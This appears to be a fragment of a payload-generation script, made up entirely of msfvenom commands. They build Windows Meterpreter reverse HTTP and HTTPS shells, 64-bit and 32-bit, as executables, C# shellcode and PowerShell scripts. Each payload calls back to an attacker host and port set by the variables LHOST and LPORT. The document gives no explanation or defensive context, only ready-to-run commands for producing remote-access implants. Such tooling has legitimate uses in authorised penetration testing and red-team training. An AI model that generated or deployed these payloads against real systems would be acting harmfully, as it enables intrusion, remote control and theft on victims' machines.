...
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./met64_https.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./met64_https.cs
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./met64_https.ps1
...
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./met64_http.exe
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./met64_http.cs
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./met64_http.ps1
...
msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./met32_https.exe
msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./met32_https.cs
msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./met32_https.ps1
...
msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./met32_http.exe
msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./met32_http.cs
msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./met32_http.ps1
